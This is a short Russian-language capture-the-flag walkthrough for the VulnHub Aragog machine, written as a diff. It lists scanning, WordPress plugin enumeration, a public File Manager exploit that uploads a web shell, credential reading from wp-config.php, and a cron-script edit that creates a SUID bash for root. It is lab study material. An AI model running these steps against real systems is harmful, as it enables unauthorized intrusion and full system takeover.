@@ -1,0 +1,42 @@
+https://www.vulnhub.com/entry/harrypotter-aragog-102,688/
+
+1)nmap -A -sS -sV -sC 192.168.100.14 -T4 -p-
+ ничего интересного
+
+2)gobuster -e -u dir http://192.168.100.14 -w /root/Downloads/common.txt -x zip,php,txt,html,bac,mp4
+ нашлась страница /blog
+    на ней присутствовали многочисленные ссылки по типу wordpress.aragog.hogwarts поэтому я добавила запись в /etc/hosts
+     192.168.100.14 wordpress.aragog.hogwarts
+3)wpscan --url http://wordpress.aragog.hogwarts/blog/ --enumerate u
+ искала пользователей, не нашлась
+
+4)wpscan --url http://192.168.100.14/blog/ --enumerate ap --plugins-detection aggressive --plugins-version-detection aggressive
+    обнаружение плагинов , среди который был один уязвимый
+
+File Manager 6.0-6.9 , сам эксплойт https://ypcs.fi/misc/code/pocs/2020-wp-file-manager-v67.py
+
+он переносит файл shell.php из папки запуска скрипта в папку файлы wordpress.aragog.hogwarts...../files
+
+5)python 2020-wp-file-manager-v67.py http://192.168.100.14/blog
+и мы получили ссылку на которой хранится наш файл shell.php
+
+в папку /usr/share/wordpress находим файл wp-config.php
+в файле видим ссылку на др файл ...... вот мы нашли файл с данными от mysql
+
+6)mysql -u<username> -p<password>       да да слитно , без этого не работало хз почему
+
+7)su hagrid98
+    passw:password123
+
+и тут для повышения привеллегий используется crontab
+.backup.sh выполняется от имени рута
+
+и в него мы дописываем то что нам нужно
+
+8)echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' > .backup.sh
+    тут мы в буквальном смысле копируем bash в tmp , повышаем привеллегии для запуска
+
+через некоторое время выполняется .backup.sh и в папке tmp появляется bash
+
+9)./bash -p
+    йххухух мы рут
